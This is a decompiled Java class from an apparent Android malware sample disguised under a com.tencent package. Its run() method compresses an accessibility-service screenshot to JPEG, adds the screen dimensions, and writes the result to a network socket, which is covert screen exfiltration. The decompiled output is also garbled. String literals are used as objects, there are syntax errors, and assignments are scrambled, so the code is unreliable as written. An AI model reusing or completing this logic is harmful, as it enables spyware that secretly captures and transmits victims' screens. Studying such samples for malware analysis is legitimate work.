package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_3_1
 * Original: Lcom/tencent/tunesxconcerningn1012$3$1;
 */
class AccessibilityServiceCore_3_1 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore$3 this$1;
    final Bitmap val$Sc_bitmap;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore$3 param0, Bitmap param1) {
        v0.this$1 = v1;
        v0.val$Sc_bitmap = v2;
        // new Object()
        return;
    }

    public void run() {
        v0 = ":";
        v1 = new ByteArrayOutputStream();
        // new ByteArrayOutputStream()
        v2 = v7.val$Sc_bitmap;
        v3 = v7.val$Sc_bitmap;
        v4 = v3.getWidth();
        v4 = v7.val$Sc_bitmap;
        v5 = v4.getHeight();
        v5 = 0;
        v3 = Bitmap.createBitmap(v2, 0, 0, v3, v4);
        v3 = Bitmap$CompressFormat.JPEG;
        v4 = 20;
        v2.compress(v3, 20, v1);
        v2 = v1.toByteArray();
        v2 = v7.this$1;
        v2 = v2.this$0;
        v3 = v2.getApplicationContext();
        v3 = "SCH";
        v6 = MySettings.read(v2, "SCH", "720");
        v6 = "SCH".getApplicationContext();
        v6 = "1080";
        MySettings.read("SCH", "SCW", "1080");
        // new StringBuilder()
        "SCW".append("1080");
        "SCW".append(":");
        "SCW".append("SCH");
        "SCW".append(":");
        "SCW".append(v2);
        "SCW".append(":");
        "SCW".append(":");
        v1 = "SCW".toString();
        v1 = DataPackagingEngine.eliminateicoolerh28(":", v1);
        v1 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v2 = ":".length;
        v1.setSendBufferSize(v2);
        v1 = DataEncryptionEngine.outpu_tunesxconcerningn102_tnew;
        v2 = ":".length;
        v1.write(":", 0, v2);
        // goto (branch)
        ":".printStackTrace();
        return;
    }
}
